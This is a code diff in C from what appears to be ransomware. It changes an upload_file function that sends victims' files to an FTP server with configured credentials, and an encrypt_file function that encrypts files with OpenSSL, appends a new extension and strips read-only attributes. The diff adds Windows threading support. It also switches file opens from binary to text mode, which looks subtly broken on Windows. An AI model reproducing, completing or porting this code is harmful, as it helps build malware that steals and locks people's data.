@@ -19,7 +19,11 @@ char *FTP_USER = NULL;
 char *FTP_PWD  = NULL;
 char *EXT      = NULL;
 
+#ifdef _WIN64
+long unsigned int upload_file(void *arg) {
+#else
 void upload_file(void *arg) {
+#endif
   char *file = (char *)arg;
 
   char userpwd[strlen(FTP_USER) + strlen(FTP_PWD) + 2];
@@ -59,9 +63,17 @@ UPLOAD_FREE:
     fclose(fp);
 
   free(file);
+
+#ifdef _WIN64
+  return 0;
+#endif
 }
 
+#ifdef _WIN64
+long unsigned int encrypt_file(void *arg) {
+#else
 void encrypt_file(void *arg) {
+#endif
   EVP_PKEY_CTX *ctx = NULL;
 
   unsigned char in_buf[INPUT_SIZE];
@@ -77,14 +89,8 @@ void encrypt_file(void *arg) {
 
   sprintf(out_file, "%s.%s", in_file, EXT);
 
-#ifdef _WIN64
-  DWORD attr = GetFileAttributes(in_file);
-  if (attr & FILE_ATTRIBUTE_READONLY)
-    SetFileAttributes(in_file, attr & ~FILE_ATTRIBUTE_READONLY);
-#endif
-
-  FILE *in  = fopen(in_file, "r+b");
-  FILE *out = fopen(out_file, "ab");
+  FILE *in  = fopen(in_file, "r");
+  FILE *out = fopen(out_file, "a");
 
   if (NULL == in || NULL == out) {
     debug("(%s) Failed to open in/out", in_file);
@@ -125,7 +131,7 @@ void encrypt_file(void *arg) {
     goto ENCRYPT_FREE;
   }
 
-  SetFileAttributes(out_file, attr);
+  SetFileAttributes(in_file, GetFileAttributes(in_file) & ~FILE_ATTRIBUTE_READONLY);
 #else
   struct stat st;
   fstat(fileno(in), &st);
@@ -155,8 +161,15 @@ ENCRYPT_FREE:
 
   if (!ok) {
     error("Failed to encrypt file: %s", in_file);
+#ifdef _WIN64
+    SetFileAttributes(out_file, GetFileAttributes(out_file) & ~FILE_ATTRIBUTE_READONLY);
+#endif
     unlink(out_file);
   }
 
   free(in_file);
+
+#ifdef _WIN64
+  return 0;
+#endif
 }
